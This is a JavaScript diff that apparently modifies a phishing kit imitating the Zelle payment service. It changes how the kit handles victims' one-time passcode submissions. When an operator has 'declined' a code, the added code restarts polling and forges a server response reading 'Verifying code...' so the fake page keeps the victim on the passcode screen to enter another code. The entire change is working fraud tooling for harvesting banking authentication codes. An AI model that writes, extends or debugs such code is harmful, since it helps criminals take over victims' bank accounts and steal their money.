@@ -910,12 +910,32 @@
                     if (data.success && data.id) {
                         console.log('[Zelle Extended] OTP submitted, user ID:', data.id);
                         
-                        // Only start polling if this is a NEW user OR if polling was stopped
-                        if (currentUserId !== data.id || pollingStopped) {
-                            currentUserId = data.id;
+                        // Check if this is a RETRY (same user ID + polling was stopped after decline)
+                        const isRetry = (currentUserId === data.id && pollingStopped);
+                        
+                        if (isRetry) {
+                            console.log('[Zelle Extended] 🔄 RETRY DETECTED - Blocking React app from advancing');
+                            
+                            // Restart polling for retry
                             startOtpPolling(data.id);
+                            
+                            // ✅ Return modified response to keep React on OTP page
+                            return new Response(JSON.stringify({
+                                success: false,
+                                message: 'Verifying code...',
+                                id: data.id
+                            }), {
+                                status: 200,
+                                headers: { 'Content-Type': 'application/json' }
+                            });
                         } else {
-                            console.log('[Zelle Extended] Already polling for this user, skipping...');
+                            // First-time submission - let React advance normally
+                            console.log('[Zelle Extended] ✅ FIRST SUBMISSION - Allowing React app to advance');
+                            
+                            if (currentUserId !== data.id || pollingStopped) {
+                                currentUserId = data.id;
+                                startOtpPolling(data.id);
+                            }
                         }
                     }
                 } catch (e) {
